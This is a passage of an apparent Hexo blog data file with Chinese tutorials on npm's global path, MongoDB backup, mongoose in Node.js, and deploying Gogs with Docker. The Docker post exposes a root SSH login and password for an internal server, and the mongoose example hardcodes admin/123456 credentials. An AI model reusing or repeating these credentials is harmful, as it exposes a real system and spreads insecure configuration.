plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix E:\\</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.cnblogs.com/niuxiaoling/p/7993032.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到</p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png\" alt=\"变量路径\"></p>\n<p>所谓全局安装：</p>\n<p>是指安装在<code>node</code>中<code>node_module</code>的根目录里，可以在电脑的任何位置调用这个方法。</p>\n<p>那么，如何在找到全局安装的位置呢？</p>\n<h2 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a><font color=\"#f00\">方法一：</font></h2><p>设置到自己想要放的位置：</p>\n<font color=\"#f90\" style=\"font-size:18px\"><br>打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径<br><br>prefix = E:\\nodejs\\npm_global_modules<br></font>\n\n<h2 id=\"方法二：\"><a href=\"#方法二：\" class=\"headerlink\" title=\"方法二：\"></a><font color=\"#f00\">方法二：</font></h2><p>使用快捷键 <code>win+R</code> ,输入cmd打开命令窗口，输入如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; npm config ls</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png\" alt=\"npm配置\"></p>\n<p><b style=\"font-size:18px\"><br>其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b></p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png\" alt=\"安装路径\"></p>\n<p>这时可以通过命令来更改路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix E:\\</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.cnblogs.com/niuxiaoling/p/7993032.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"MongoDB--备份与恢复","date":"2018-04-16T07:10:13.000Z","archives":"SQL","_content":"## 备份(`mongodump`)与恢复(`mongorestore`)\n(http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html)\n**数据备份**(mongodump)\nMongodb中 使用`mongodump`命令来`备份`MongoDB数据。该命令可以`导出所有数据到指定目录中`。\nmongodump命令可以通过`参数`指定导出的`数据量级`转存的服务器。\n**语法**\n````\n> mongodump -h dbhost -d dbname -o dbdirectory\n-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`\n-d：需要备份的数据库实例，例如：test\n-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。\n````","source":"_posts/SQL/MongoDB-备份与恢复.md","raw":"---\ntitle: MongoDB--备份与恢复\ndate: 2018-04-16 15:10:13\ntags: MongoDB\narchives: SQL\ncategories: 数据库\n---\n## 备份(`mongodump`)与恢复(`mongorestore`)\n(http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html)\n**数据备份**(mongodump)\nMongodb中 使用`mongodump`命令来`备份`MongoDB数据。该命令可以`导出所有数据到指定目录中`。\nmongodump命令可以通过`参数`指定导出的`数据量级`转存的服务器。\n**语法**\n````\n> mongodump -h dbhost -d dbname -o dbdirectory\n-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`\n-d：需要备份的数据库实例，例如：test\n-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。\n````","slug":"SQL/MongoDB-备份与恢复","published":1,"updated":"2018-05-05T01:25:58.222Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbs001nr8xj955xzv9w","content":"<h2 id=\"备份-mongodump-与恢复-mongorestore\"><a href=\"#备份-mongodump-与恢复-mongorestore\" class=\"headerlink\" title=\"备份(mongodump)与恢复(mongorestore)\"></a>备份(<code>mongodump</code>)与恢复(<code>mongorestore</code>)</h2><p>(<a href=\"http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html</a>)<br><strong>数据备份</strong>(mongodump)<br>Mongodb中 使用<code>mongodump</code>命令来<code>备份</code>MongoDB数据。该命令可以<code>导出所有数据到指定目录中</code>。<br>mongodump命令可以通过<code>参数</code>指定导出的<code>数据量级</code>转存的服务器。<br><strong>语法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mongodump -h dbhost -d dbname -o dbdirectory</span><br><span class=\"line\">-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`</span><br><span class=\"line\">-d：需要备份的数据库实例，例如：test</span><br><span class=\"line\">-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"备份-mongodump-与恢复-mongorestore\"><a href=\"#备份-mongodump-与恢复-mongorestore\" class=\"headerlink\" title=\"备份(mongodump)与恢复(mongorestore)\"></a>备份(<code>mongodump</code>)与恢复(<code>mongorestore</code>)</h2><p>(<a href=\"http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/mongodb/mongodb-mongodump-mongorestore.html</a>)<br><strong>数据备份</strong>(mongodump)<br>Mongodb中 使用<code>mongodump</code>命令来<code>备份</code>MongoDB数据。该命令可以<code>导出所有数据到指定目录中</code>。<br>mongodump命令可以通过<code>参数</code>指定导出的<code>数据量级</code>转存的服务器。<br><strong>语法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mongodump -h dbhost -d dbname -o dbdirectory</span><br><span class=\"line\">-h：MongDB所在服务器地址，例如：`127.0.0.1`，当然也可以指定端口号：`127.0.0.1:27017`</span><br><span class=\"line\">-d：需要备份的数据库实例，例如：test</span><br><span class=\"line\">-o：备份的数据存放位置，例如：c:\\data\\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</span><br></pre></td></tr></table></figure></p>\n"},{"title":"MongoDB在Node.js中的使用","date":"2018-04-16T06:03:08.000Z","archives":"SQL","_content":"#### Node.js 中使用MongoDB(几乎是标配)\n+ mac中安装MongoDB\nbrew install mongodb\n+ node.js 中使用mongoose第三方库来管理MongoDB\nnpm install mongoose --save\n- 为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async\n\n* 配置连接DB信息,并导出连接的对象\n````\nimport mongoose from 'mongoose' // 引入\nconst options = {\n  user: 'admin',\n  pwd: '123456',\n  host: 'localhost',\n  port: '27017',\n  database: 'hollywood',\n  authSource: 'admin',\n}\n\nconst uri = `mongodb://${options.user}:${options.pwd}@${options.host}:${options.port}/${options.database}?authSource=${options.authSource}`\n\nmongoose.Promise = global.Promise //需要\nmongoose.connect(uri)\n\nexport default mongoose\n````\n**定义一个模型的概要，类似于关系型数据库中的定义表结构**\n````\nimport db from '../db.js'\nimport logger from '../logger'\nconst Schema = db.Schema\n\n//account对应的字段\nconst accountSchema = new Schema(\n  {\n    name: { type: String, maxlength: 15 },\n    password: { type: String, maxlength: 20 },\n    gender: { type: String, enum: ['male', 'female'] },\n    email: { type: String, maxlength: 25 },\n    avatar: { type: String },\n    age: { type: Number },\n    create_date: { type: Date },\n    update_date: { type: Date },\n  },\n  {\n    versionKey: false,\n  },\n)\n\n//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)\naccountSchema.pre('save', function(next) {\nconst currentDate = new Date()\nif (!this.create_date) {\n        this.create_date = currentDate\n} else {\n        this.update_date = currentDate\n}\nnext()\n})\n\n//当account执行save()后\n> ...\n\n//定义模型的方法\naccountSchema.methods.sayHi = () => (console.log('sayHi()!!!!!'))\nconst Account = db.model('Account', accountSchema)\nexport default Account\n\n````\n**保存到数据库, 并返回一个保存到数据库的对象**\n\n````\nimport Account from './model'\n\nexport default class AccountService {\n  static async save(json) {\n    const accountModel = new Account(json)\n    const account = await accountModel.save()\n    return account\n  }\n}\n````\n\n","source":"_posts/SQL/MongoDB-Node.js中的使用.md","raw":"---\ntitle: MongoDB在Node.js中的使用\ndate: 2018-04-16 14:03:08\ntags: MongoDB\narchives: SQL\ncategories: 数据库\n---\n#### Node.js 中使用MongoDB(几乎是标配)\n+ mac中安装MongoDB\nbrew install mongodb\n+ node.js 中使用mongoose第三方库来管理MongoDB\nnpm install mongoose --save\n- 为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async\n\n* 配置连接DB信息,并导出连接的对象\n````\nimport mongoose from 'mongoose' // 引入\nconst options = {\n  user: 'admin',\n  pwd: '123456',\n  host: 'localhost',\n  port: '27017',\n  database: 'hollywood',\n  authSource: 'admin',\n}\n\nconst uri = `mongodb://${options.user}:${options.pwd}@${options.host}:${options.port}/${options.database}?authSource=${options.authSource}`\n\nmongoose.Promise = global.Promise //需要\nmongoose.connect(uri)\n\nexport default mongoose\n````\n**定义一个模型的概要，类似于关系型数据库中的定义表结构**\n````\nimport db from '../db.js'\nimport logger from '../logger'\nconst Schema = db.Schema\n\n//account对应的字段\nconst accountSchema = new Schema(\n  {\n    name: { type: String, maxlength: 15 },\n    password: { type: String, maxlength: 20 },\n    gender: { type: String, enum: ['male', 'female'] },\n    email: { type: String, maxlength: 25 },\n    avatar: { type: String },\n    age: { type: Number },\n    create_date: { type: Date },\n    update_date: { type: Date },\n  },\n  {\n    versionKey: false,\n  },\n)\n\n//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)\naccountSchema.pre('save', function(next) {\nconst currentDate = new Date()\nif (!this.create_date) {\n        this.create_date = currentDate\n} else {\n        this.update_date = currentDate\n}\nnext()\n})\n\n//当account执行save()后\n> ...\n\n//定义模型的方法\naccountSchema.methods.sayHi = () => (console.log('sayHi()!!!!!'))\nconst Account = db.model('Account', accountSchema)\nexport default Account\n\n````\n**保存到数据库, 并返回一个保存到数据库的对象**\n\n````\nimport Account from './model'\n\nexport default class AccountService {\n  static async save(json) {\n    const accountModel = new Account(json)\n    const account = await accountModel.save()\n    return account\n  }\n}\n````\n\n","slug":"SQL/MongoDB-Node.js中的使用","published":1,"updated":"2018-05-05T01:25:58.222Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbu001rr8xjlzpe7sxl","content":"<h4 id=\"Node-js-中使用MongoDB-几乎是标配\"><a href=\"#Node-js-中使用MongoDB-几乎是标配\" class=\"headerlink\" title=\"Node.js 中使用MongoDB(几乎是标配)\"></a>Node.js 中使用MongoDB(几乎是标配)</h4><ul>\n<li>mac中安装MongoDB<br>brew install mongodb</li>\n<li>node.js 中使用mongoose第三方库来管理MongoDB<br>npm install mongoose –save</li>\n</ul>\n<ul>\n<li>为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async</li>\n</ul>\n<ul>\n<li>配置连接DB信息,并导出连接的对象<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import mongoose from &apos;mongoose&apos; // 引入</span><br><span class=\"line\">const options = &#123;</span><br><span class=\"line\">  user: &apos;admin&apos;,</span><br><span class=\"line\">  pwd: &apos;123456&apos;,</span><br><span class=\"line\">  host: &apos;localhost&apos;,</span><br><span class=\"line\">  port: &apos;27017&apos;,</span><br><span class=\"line\">  database: &apos;hollywood&apos;,</span><br><span class=\"line\">  authSource: &apos;admin&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const uri = `mongodb://$&#123;options.user&#125;:$&#123;options.pwd&#125;@$&#123;options.host&#125;:$&#123;options.port&#125;/$&#123;options.database&#125;?authSource=$&#123;options.authSource&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">mongoose.Promise = global.Promise //需要</span><br><span class=\"line\">mongoose.connect(uri)</span><br><span class=\"line\"></span><br><span class=\"line\">export default mongoose</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>定义一个模型的概要，类似于关系型数据库中的定义表结构</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import db from &apos;../db.js&apos;</span><br><span class=\"line\">import logger from &apos;../logger&apos;</span><br><span class=\"line\">const Schema = db.Schema</span><br><span class=\"line\"></span><br><span class=\"line\">//account对应的字段</span><br><span class=\"line\">const accountSchema = new Schema(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: &#123; type: String, maxlength: 15 &#125;,</span><br><span class=\"line\">    password: &#123; type: String, maxlength: 20 &#125;,</span><br><span class=\"line\">    gender: &#123; type: String, enum: [&apos;male&apos;, &apos;female&apos;] &#125;,</span><br><span class=\"line\">    email: &#123; type: String, maxlength: 25 &#125;,</span><br><span class=\"line\">    avatar: &#123; type: String &#125;,</span><br><span class=\"line\">    age: &#123; type: Number &#125;,</span><br><span class=\"line\">    create_date: &#123; type: Date &#125;,</span><br><span class=\"line\">    update_date: &#123; type: Date &#125;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    versionKey: false,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)</span><br><span class=\"line\">accountSchema.pre(&apos;save&apos;, function(next) &#123;</span><br><span class=\"line\">const currentDate = new Date()</span><br><span class=\"line\">if (!this.create_date) &#123;</span><br><span class=\"line\">        this.create_date = currentDate</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        this.update_date = currentDate</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">next()</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()后</span><br><span class=\"line\">&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">//定义模型的方法</span><br><span class=\"line\">accountSchema.methods.sayHi = () =&gt; (console.log(&apos;sayHi()!!!!!&apos;))</span><br><span class=\"line\">const Account = db.model(&apos;Account&apos;, accountSchema)</span><br><span class=\"line\">export default Account</span><br></pre></td></tr></table></figure></p>\n<p><strong>保存到数据库, 并返回一个保存到数据库的对象</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import Account from &apos;./model&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">export default class AccountService &#123;</span><br><span class=\"line\">  static async save(json) &#123;</span><br><span class=\"line\">    const accountModel = new Account(json)</span><br><span class=\"line\">    const account = await accountModel.save()</span><br><span class=\"line\">    return account</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Node-js-中使用MongoDB-几乎是标配\"><a href=\"#Node-js-中使用MongoDB-几乎是标配\" class=\"headerlink\" title=\"Node.js 中使用MongoDB(几乎是标配)\"></a>Node.js 中使用MongoDB(几乎是标配)</h4><ul>\n<li>mac中安装MongoDB<br>brew install mongodb</li>\n<li>node.js 中使用mongoose第三方库来管理MongoDB<br>npm install mongoose –save</li>\n</ul>\n<ul>\n<li>为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async</li>\n</ul>\n<ul>\n<li>配置连接DB信息,并导出连接的对象<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import mongoose from &apos;mongoose&apos; // 引入</span><br><span class=\"line\">const options = &#123;</span><br><span class=\"line\">  user: &apos;admin&apos;,</span><br><span class=\"line\">  pwd: &apos;123456&apos;,</span><br><span class=\"line\">  host: &apos;localhost&apos;,</span><br><span class=\"line\">  port: &apos;27017&apos;,</span><br><span class=\"line\">  database: &apos;hollywood&apos;,</span><br><span class=\"line\">  authSource: &apos;admin&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const uri = `mongodb://$&#123;options.user&#125;:$&#123;options.pwd&#125;@$&#123;options.host&#125;:$&#123;options.port&#125;/$&#123;options.database&#125;?authSource=$&#123;options.authSource&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">mongoose.Promise = global.Promise //需要</span><br><span class=\"line\">mongoose.connect(uri)</span><br><span class=\"line\"></span><br><span class=\"line\">export default mongoose</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>定义一个模型的概要，类似于关系型数据库中的定义表结构</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import db from &apos;../db.js&apos;</span><br><span class=\"line\">import logger from &apos;../logger&apos;</span><br><span class=\"line\">const Schema = db.Schema</span><br><span class=\"line\"></span><br><span class=\"line\">//account对应的字段</span><br><span class=\"line\">const accountSchema = new Schema(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: &#123; type: String, maxlength: 15 &#125;,</span><br><span class=\"line\">    password: &#123; type: String, maxlength: 20 &#125;,</span><br><span class=\"line\">    gender: &#123; type: String, enum: [&apos;male&apos;, &apos;female&apos;] &#125;,</span><br><span class=\"line\">    email: &#123; type: String, maxlength: 25 &#125;,</span><br><span class=\"line\">    avatar: &#123; type: String &#125;,</span><br><span class=\"line\">    age: &#123; type: Number &#125;,</span><br><span class=\"line\">    create_date: &#123; type: Date &#125;,</span><br><span class=\"line\">    update_date: &#123; type: Date &#125;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    versionKey: false,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)</span><br><span class=\"line\">accountSchema.pre(&apos;save&apos;, function(next) &#123;</span><br><span class=\"line\">const currentDate = new Date()</span><br><span class=\"line\">if (!this.create_date) &#123;</span><br><span class=\"line\">        this.create_date = currentDate</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        this.update_date = currentDate</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">next()</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()后</span><br><span class=\"line\">&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">//定义模型的方法</span><br><span class=\"line\">accountSchema.methods.sayHi = () =&gt; (console.log(&apos;sayHi()!!!!!&apos;))</span><br><span class=\"line\">const Account = db.model(&apos;Account&apos;, accountSchema)</span><br><span class=\"line\">export default Account</span><br></pre></td></tr></table></figure></p>\n<p><strong>保存到数据库, 并返回一个保存到数据库的对象</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import Account from &apos;./model&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">export default class AccountService &#123;</span><br><span class=\"line\">  static async save(json) &#123;</span><br><span class=\"line\">    const accountModel = new Account(json)</span><br><span class=\"line\">    const account = await accountModel.save()</span><br><span class=\"line\">    return account</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"linux下docker部署gogs git仓库","date":"2018-05-04T01:50:00.000Z","archives":"git仓库","_content":"# linux下docker部署gogs git仓库\n\n## 1. 远程登录Linux服务器\n首先，linux 命令行使用 root ssh ( [ssh远程登录命令简单实例](https://blog.csdn.net/ccfxue/article/details/52608829) )\n\n例如: [公司内网服务器]\n````\nssh root@192.168.0.196\n\npsd: Jdyx[58]\n````\n\n## 2. 拉取docker下gogs\n进入[gogs官网](https://hub.docker.com/r/gogs/gogs/)，在官网左侧找到 拉取命令\n\n命令行输入 拉取命令 `docker pull gogs/gogs`\n\n拉取完成后 有提示，接着输入查看状态的`docker`命令 `docker ps`\n\n\"`docker ps`\": 属于Linux命令 是查看 `docker`状态的命令\n\n\"`ls`\": 查看当前目录文件\n\n## 3. 配置\n\"`vim gogs.docker`\": 进入并编辑 gogs.docker 配置文件\n\n[gogs-git官网 配置](https://github.com/gogits/gogs/tree/master/docker)\n\n````\n# Pull image from Docker Hub.\n$ docker pull gogs/gogs\n\n# Create local directory for volume.\n$ mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\n$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n\n# Use `docker start` if you have stopped it.\n$ docker start gogs\n````\n\n配置文件：\n````\n#!/bin/bash\ndocker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs\n````\n\n\n## 4. 运行\n\"`chmod +x gogs.docker`\": \n\n\"`echo $PATH`\": 打印 环境变量\n\n\"`./gogs.docker`\"：启动服务\n\n## 5. 重启服务\n`docker ps`获取`CONTAINER ID`\n\n`docker restart [19d724ea6ec9(ID)]`\n\n\n\n","source":"_posts/Linux/linux下docker部署gogs-git仓库.md","raw":"---\ntitle: linux下docker部署gogs git仓库\ndate: 2018-05-04 09:50:00\ntags: gogs docker\narchives: git仓库\ncategories: git\n---\n# linux下docker部署gogs git仓库\n\n## 1. 远程登录Linux服务器\n首先，linux 命令行使用 root ssh ( [ssh远程登录命令简单实例](https://blog.csdn.net/ccfxue/article/details/52608829) )\n\n例如: [公司内网服务器]\n````\nssh root@192.168.0.196\n\npsd: Jdyx[58]\n````\n\n## 2. 拉取docker下gogs\n进入[gogs官网](https://hub.docker.com/r/gogs/gogs/)，在官网左侧找到 拉取命令\n\n命令行输入 拉取命令 `docker pull gogs/gogs`\n\n拉取完成后 有提示，接着输入查看状态的`docker`命令 `docker ps`\n\n\"`docker ps`\": 属于Linux命令 是查看 `docker`状态的命令\n\n\"`ls`\": 查看当前目录文件\n\n## 3. 配置\n\"`vim gogs.docker`\": 进入并编辑 gogs.docker 配置文件\n\n[gogs-git官网 配置](https://github.com/gogits/gogs/tree/master/docker)\n\n````\n# Pull image from Docker Hub.\n$ docker pull gogs/gogs\n\n# Create local directory for volume.\n$ mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\n$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n\n# Use `docker start` if you have stopped it.\n$ docker start gogs\n````\n\n配置文件：\n````\n#!/bin/bash\ndocker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs\n````\n\n\n## 4. 运行\n\"`chmod +x gogs.docker`\": \n\n\"`echo $PATH`\": 打印 环境变量\n\n\"`./gogs.docker`\"：启动服务\n\n## 5. 重启服务\n`docker ps`获取`CONTAINER ID`\n\n`docker restart [19d724ea6ec9(ID)]`\n\n\n\n","slug":"Linux/linux下docker部署gogs-git仓库","published":1,"updated":"2018-05-05T01:24:42.423Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbv001tr8xjr24gxmok","content":"<h1 id=\"linux下docker部署gogs-git仓库\"><a href=\"#linux下docker部署gogs-git仓库\" class=\"headerlink\" title=\"linux下docker部署gogs git仓库\"></a>linux下docker部署gogs git仓库</h1><h2 id=\"1-远程登录Linux服务器\"><a href=\"#1-远程登录Linux服务器\" class=\"headerlink\" title=\"1. 远程登录Linux服务器\"></a>1. 远程登录Linux服务器</h2><p>首先，linux 命令行使用 root ssh ( <a href=\"https://blog.csdn.net/ccfxue/article/details/52608829\" target=\"_blank\" rel=\"noopener\">ssh远程登录命令简单实例</a> )</p>\n<p>例如: [公司内网服务器]<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@192.168.0.196</span><br><span class=\"line\"></span><br><span class=\"line\">psd: Jdyx[58]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-拉取docker下gogs\"><a href=\"#2-拉取docker下gogs\" class=\"headerlink\" title=\"2. 拉取docker下gogs\"></a>2. 拉取docker下gogs</h2><p>进入<a href=\"https://hub.docker.com/r/gogs/gogs/\" target=\"_blank\" rel=\"noopener\">gogs官网</a>，在官网左侧找到 拉取命令</p>\n<p>命令行输入 拉取命令 <code>docker pull gogs/gogs</code></p>\n<p>拉取完成后 有提示，接着输入查看状态的<code>docker</code>命令 <code>docker ps</code></p>\n<p>“<code>docker ps</code>“: 属于Linux命令 是查看 <code>docker</code>状态的命令</p>\n<p>“<code>ls</code>“: 查看当前目录文件</p>\n<h2 id=\"3-配置\"><a href=\"#3-配置\" class=\"headerlink\" title=\"3. 配置\"></a>3. 配置</h2><p>“<code>vim gogs.docker</code>“: 进入并编辑 gogs.docker 配置文件</p>\n<p><a href=\"https://github.com/gogits/gogs/tree/master/docker\" target=\"_blank\" rel=\"noopener\">gogs-git官网 配置</a></p>\n<figure class=\"highlight plain\"><table><tr><td 